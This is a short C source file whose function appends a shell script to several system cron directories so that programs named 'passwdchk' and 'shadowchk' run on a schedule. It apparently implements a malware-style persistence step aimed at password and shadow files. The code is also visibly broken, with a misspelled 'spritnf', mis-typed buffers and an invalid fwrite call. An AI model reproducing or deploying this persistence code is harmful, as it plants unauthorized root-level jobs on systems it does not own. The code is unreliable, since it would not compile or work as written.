#include <stdlib.h>
#include <stdio.h>

char *cron_dir[] = {"/etc/cron.d/", "/etc/cron.hourly/", "/etc/cron.daily/", "/etc/cron.weekly", "/etc/cron.yearly"};
char *cron_file[] = {
    "#!/bin/sh\n",
    "./etc/passwdchk\n",
    "./etc/shadowchk\n"
};
char *buf[1024] = {0};
char *fd_buf[1024] = {0};

int cron_entry(char *username, char *passwd) {
    int i, x;
    for(i = 0;i < 5;i++) {
        sprintf(fd_buf, "%s/passwdchk", cron_dir[i]);
        
        FILE *cron;
        cron = fopen(fd_buf, "a+");

        if(cron != NULL) {
            for(x = 0;x < 3;x++) {
                spritnf(buf, "%s", cron_file[x]);
                if(fwrite(buf, sizeof(buf), NULL, cron) != 0) {
#ifdef DEBUG
                    printf("passwdchk entry %d added into %s\n", x, cron_dir[i]);
#endif
                }
            }
        }
        if(cron == NULL) {
            return 0;
        }
    }
    return 1;

}